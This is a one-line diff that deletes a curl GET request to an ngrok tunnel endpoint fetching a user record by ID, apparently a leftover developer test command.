@@ -1,1 +1,0 @@
-curl https://c59da4db672d.ngrok-free.app/users/d70f461a-6135-4ef0-96ab-29cdd051d1c9
